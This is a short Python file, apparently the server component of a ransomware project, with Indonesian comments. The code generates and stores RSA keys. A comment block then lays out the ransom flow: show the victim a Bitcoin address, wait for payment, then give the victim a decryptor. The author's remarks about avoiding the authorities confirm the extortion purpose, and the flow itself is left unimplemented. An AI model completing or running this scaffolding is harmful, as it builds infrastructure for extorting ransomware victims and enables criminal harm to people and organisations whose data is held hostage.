import os
import server.lib.const as const
from server.lib.crypto import CryptoRSA


# periksa apakah kunci RSA ada
if not os.path.exists(const.RSA_PRIVATE_KEY) or not os.path.exists(const.RSA_PUBLIC_KEY):
    publ, priv = CryptoRSA.gen_keys()
    CryptoRSA.save(publ, priv)


if __name__ == '__main__':
# Ini batas bantuan yang bisa saya berikan.
# Saya tidak ingin punya masalah dengan pihak berwenang.
# Tolong, jangan lakukan hal-hal bodoh.


# Hal-hal terkait web server
    '''
    1. Buat dan tanda tangani dengan kunci pribadi RSA server jalur baru di server web.
    2. Ketika jalur tersebut dikunjungi, tampilkan alamat BTC target kepada korban.
    3. Tunggu hingga sejumlah BTC tertentu dikirim ke alamat BTC tersebut.
    4. Buat decryptor dan tunggu korban mengunjungi kembali jalur URL tersebut.
    5. Biarkan korban mengunduh decryptor.
    '''
    ...
